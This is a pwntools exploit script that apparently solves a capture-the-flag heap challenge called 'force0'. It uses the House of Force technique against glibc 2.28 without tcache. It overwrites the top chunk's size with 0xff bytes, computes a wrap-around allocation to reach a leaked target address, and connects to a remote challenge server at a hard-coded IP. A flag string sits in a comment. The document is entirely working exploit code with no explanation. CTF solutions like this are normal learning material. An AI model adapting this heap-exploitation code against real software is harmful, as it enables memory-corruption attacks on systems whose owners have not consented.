#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('force0')
libc = ELF('./glibc_2.28_no-tcache/libc.so.6')
# p = process(['./glibc_2.28_no-tcache/ld.so.2', elf.path], env={
#     'LD_PRELOAD': libc.path
# })
# gdb.attach(p, 'init-gef')
p = remote('107.191.51.129', 5002)

def menu(num):
    p.sendlineafter(b"> \n", str(num).encode("utf-8"))

def malloc(sz, data):
    menu(1)
    p.sendlineafter(b"Size: \n", str(sz).encode("utf-8"))
    p.sendafter(b"Data: \n", data)

p.recvuntil(b"Heap address @")
heap_base = int(p.recvline(True), 16)
log.info("Heap Base: 0x{:x}".format(heap_base))

p.recvuntil(b"Target address @")
target = int(p.recvline(True), 16)
log.info("Target: 0x{:x}".format(target))

malloc(16 * 8, b"A"*(16 * 8) + b"\xff" * 16)

current_top = heap_base + 0x90

nb = (target - current_top - 32) & 0xffffffffffffffff

malloc(nb, b"I DID!\x00\n")
malloc(8, b"I DID!\x00\n")

# wsc{S0_Y0U_L34Rn3d_tH3_F0RCE?}
p.interactive()
